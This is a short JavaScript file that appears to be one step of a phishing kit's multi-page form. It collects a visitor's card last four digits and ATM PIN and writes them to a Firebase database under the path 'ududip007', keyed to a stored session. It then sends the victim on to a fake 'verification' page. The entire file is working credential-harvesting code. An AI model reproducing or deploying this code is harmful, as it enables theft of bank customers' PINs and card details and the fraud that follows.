// form-step3.js

const key = localStorage.getItem("firebaseKey");

if (!key) {
  alert("No session found. Please go back to Step 1.");
  window.location.href = "index.html";
}

const ref = firebase.database().ref("ududip007/" + key);

document.getElementById("step3form").addEventListener("submit", function (e) {
  e.preventDefault();

  const last4 = document.getElementById("last4").value;
  const pin = document.getElementById("pin").value;

  ref.update({
    f_LAST4: last4,
    g_ATMPIN: pin
  }).then(() => {
    window.location.href = "last.html"; // Verification page
  }).catch((error) => {
    alert("Error: " + error.message);
  });
});
